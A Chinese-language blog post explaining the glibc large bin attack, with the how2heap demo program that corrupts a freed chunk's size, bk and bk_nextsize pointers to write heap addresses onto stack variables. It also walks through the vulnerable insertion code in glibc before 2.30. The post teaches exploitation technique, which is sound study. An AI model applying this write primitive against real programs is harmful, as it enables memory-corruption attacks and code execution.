---
layout: post
title: "[PWN]堆的LargebinAttack学习"
date: 2026-04-28
categories: [PWN]
---
# LargebinAttack

和其它堆漏洞的利用差不多，largebin attack也是通过其他可写漏洞改写指针来进行往指定的位置写指定的内容，先来说说largebin 特有的一些机制。
largebin使用的也是双向链表，但比起unsortedbin，多出来了一个跳表机制。
largebin中的chunk通常更大，因此为了方便找到合适的chunk，不同大小的chunk会进行分类，这个分类使用的就是跳表机制，比如0x400、0x410就在同一个size区间，使用同一个头指针，而0x500、0x510，又会使用另一个头指针，其结构如图

![ref1](/assets/images/2026-04-28-LargebinAttack/ref1.png)


为此，largebin除了有fd和bk，还有fd_nextsize和bk_nextsize指针用于不同size区间之间的移动，一般只用到第一个节点的fd_nextsize和bk_nextsize，比如这里0x400的chunk的fd_nextsize就会指向0x500，0x500的bk_nextsize则会指向0x400，这两个指针就是我们要利用的

漏洞存在于malloc的时候，从unsorted bin中进行切割划分，然后将对应chunk置入对应bin的过程中，在较早的glibc（<2.30）的操作中，缺乏对fd_nextsize和bk_nextsize的检查

这里用how2heap中，往stack中写数据来举例：
``` c
// 主要漏洞在这里
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

// gcc large_bin_attack.c -o large_bin_attack -g
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
                    "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0xdead;
    unsigned long stack_var2 = 0xbeef;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                    " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                    " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
                    " the third large chunk during the free()\n\n");
    malloc(0x20);

    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
                    " [ %p <--> %p ]\n\n",
            (void *)(p2 - 2), (void *)(p2[0]));

    void* p4 = malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                    " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                    ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                    " [ %p ]\n\n",
            (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
                    " [ %p <--> %p ]\n\n",
            (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
                    " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
                    " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
                    " \"bksiz_nexte\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);

    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
                    " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}
```
首先，代码分配了一个0x320大小的large chunk(a)，然后接着分配了0x400(b)和0x400(c)的large chunk，当然中间需要分配其它大小的chunk，比如这里是0x20以免free的时候large chunk直接合并了，然后free掉第一个a和第二个b large chunk，这样两个chunk就进入unsorted bin了

接下来分配一个比第一块要小的chunk（0x90的），此时malloc就会在分配的过程前先计算所需，把bin分类一下，这样第二个large chunk b就会被分类为large bin，然后第一个freed large chunk a会切割出一部分用于分配新chunk，剩下的接着放回unsorted bin。再free掉第三个large chunk c，这样第三个chunk也进了unsorted bin。

重点的利用过程来了，对于现在这个已经进large bin的b，利用漏洞（比如uaf）去修改它的size、bk、bk_nextsize，使size变得比0x400小（要比c小，这里例子是0x3f1），bk设为想要写的地址的大小减去16字节，bk_nextsize也设为想要写的地址减去32字节（var1 - 2与var2 - 4）。然后再次malloc，再次触发计算size，此时依然会从第一块a中切割，然后把第三块c的size算了发现应该放入large bin，并且由于修改了第二块的size，此时的c会插入到b前面：

```bash
largebin[i]<->c<->b
```

之前是这样

``` bash
largebin[i]<->b
```

其实在只有一个节点的时候，b的bk_nextsize和fd_nextsize指针都指向b本身的这个插入就会触发漏洞，就会进行写操作。原理如下：
原本b为第一个节点，它负责管理largebin\[i\]这一条同区间size的xx_nextsize指针，现在插入c，c会变为第一个节点，而b变为第二个，很明显管理xx_nextsize也要跟着交接，涉及到以下漏洞代码：

```bash
bck与fwd是相对于插入后的c的
p->fd_nextsize = fwd; //fwd == b
p->bk_nextsize = fwd->bk_nextsize;  
fwd->bk_nextsize = p;
p->bk_nextsize->fd_nextsize = p;
bck = fwd->bk
```

代入到现在的场景，p就是c，fwd就是b，正常来说，前四行代码分别干了以下事情：
1.把c的fd_nextsize指向b

2.把c的bk_nextsize指向b的bk_nextsize，也是b

3.把b的bk_nextsize指向新插入的c

4.把c的bk_nextsize指向的节点，即b的fd_nextsize指针也指向c

即b和c的xx_nextsize都相互指向

当然，在b的xx_nextsize被改变后，这个插入的逻辑关系就可以不管了，只注意代码执行的时候值的变化就行了

在执行第四行的代码时，与原本是fwd->bk_nextsize->fd_nextsize = p，而fwd->bk_nextsize变成了(var2-4+4)，也就是var2 = p，把p指针当作值写进var2里去了，下图是插入victim后的xx_nextsize指针的指向

![ref2](/assets/images/2026-04-28-LargebinAttack/ref2.png)

除了xx_nextsize的维护过程，后面的fd/bk的维护过程也有漏洞，和unsortedbin差不多，就不多说了，代码如下
```c
    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
```
